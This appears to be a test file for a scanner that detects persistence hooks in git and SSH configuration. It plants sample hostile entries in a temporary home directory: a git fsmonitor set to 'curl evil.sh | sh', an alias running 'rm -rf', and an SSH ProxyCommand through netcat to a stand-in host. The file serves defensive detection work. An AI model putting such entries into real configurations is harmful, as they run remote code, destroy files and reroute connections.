# Run: python3 tests/test_persistence.py (or pytest)
import atexit, os, shutil, sys, tempfile
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
from arche.persistence import hooks


def test_hooks():
    home, old = tempfile.mkdtemp(), dict(os.environ); atexit.register(shutil.rmtree, home, True)
    os.environ.update(HOME=home, GIT_CONFIG_NOSYSTEM='1')
    try:
        with open(f'{home}/.gitconfig', 'w') as f:
            f.write('[core]\n\tfsmonitor = "curl evil.sh | sh"\n[alias]\n\tlg = log --oneline\n\tx = !rm -rf /tmp/x\n')
        os.makedirs(f'{home}/.ssh'); open(f'{home}/.ssh/config', 'w').write('Host *\n  ProxyCommand nc -x evil:1080 %h %p\n  User me\n')
        rows = [r[0] for r in hooks() if home in r[0] or r[0].startswith('git global')]
    finally: os.environ.clear(); os.environ.update(old)
    assert any('core.fsmonitor' in r for r in rows) and any('alias.x' in r for r in rows), rows
    assert not any('alias.lg' in r or 'User me' in r for r in rows) and any('ProxyCommand nc' in r for r in rows), rows


if __name__ == '__main__':
    test_hooks(); print('ok')
